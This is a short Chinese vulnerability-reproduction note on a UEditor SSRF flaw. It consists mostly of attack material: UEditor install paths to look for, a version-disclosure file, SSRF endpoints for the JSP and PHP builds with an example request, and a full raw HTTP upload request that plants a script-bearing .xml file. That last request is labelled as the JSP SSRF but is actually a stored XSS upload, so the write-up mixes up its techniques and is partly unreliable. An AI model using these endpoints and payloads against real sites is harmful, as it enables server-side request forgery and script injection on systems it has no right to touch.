# ueditor存在SSRF漏洞

### 一、漏洞描述
ueditor存在SSRF漏洞

### 二、影响版本
![1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22.png](./img/f5KIX_0DKetAE9TO/1720728132194-b3f361fa-461b-41ae-97cf-c3e8d0598b22-874641.png)

### 三、漏洞复现
Ueditor路径：

```plain
/ueditor/
/ueditor-1.4.3.3/net/
/ueditor1_4_3_3-utf8-net/utf8-net/
/utf8-net/
```

查看版本：

```plain
/ueditor/ueditor.all.js
```

SSRF路径

```plain
/jsp/controller.jsp?action=catchimage&source[]=
/jsp/getRemoteImage.jsp?upfile=
/php/controller.php?action=catchimage&source[]=
```

PHP版本：

```plain
/ueditor/php/controller.php?action=catchimage&source[]=x.x.x
```

![1724055281930-a207d66d-0a8b-4a8e-86df-2bc1314aaac4.png](./img/f5KIX_0DKetAE9TO/1724055281930-a207d66d-0a8b-4a8e-86df-2bc1314aaac4-071913.png)

JSP版本：

```plain
POST /ueditor/jsp/controller.jsp?action=uploadfile&encode=utf-8 HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Length: 323


------WebKitFormBoundarynJAiy5Qly8XpmZmQ
Content-Disposition: form-data; name="upfile"; filename="1.xml"
Content-Type: image/png

<html>
<head></head>
<body>
<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
</body>
</html>
------WebKitFormBoundarynJAiy5Qly8XpmZmQ--
```



> 更新: 2024-09-05 23:24:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nvizlic3zcdfd5rg>